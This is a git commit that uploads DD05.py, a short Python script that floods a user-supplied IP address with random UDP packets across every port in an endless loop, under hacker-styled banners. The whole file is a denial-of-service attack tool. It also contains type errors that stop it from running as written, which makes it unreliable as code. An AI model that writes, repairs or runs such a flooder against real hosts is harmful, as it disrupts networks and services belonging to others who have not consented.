22b0875918b490502e59d5d717abcae7916d103a
zoomer <51061101+calebrwalk5@users.noreply.github.com>
2021-10-27 00:51:50 +0000

    Add files via upload

---
+++ DD05.py
@@ -0,0 +1,33 @@
+import socket, os, random, time
+
+B = '\033[1m'
+R = '\033[31m'
+N = '\033[0m'
+
+from datetime import datetime
+now = datetime.now()
+hour = now.hour
+minute = now.minute
+day = now.day
+month = now.month
+year = now.year
+
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1024)
+os.system("clear")
+print (R+"#FVCK 50C137Y")
+print (B+"#FR33D0M I5 4N I11U510N"+N)
+print
+ip = input("[$] TARGET IP: ")
+port = input("[$] PORT: ")
+os.system("clear")
+time.sleep(2)
+print()
+sent = 0
+while True:
+	sock.sendto(bytes, (ip,port))
+	sent = sent + 1
+	port = port + 1
+	print("Sent %s packet to %s throught port: %s") % (sent,ip,port)
+	if port == 65534: # Once it reaches the max, go back to the min
+		port = 1
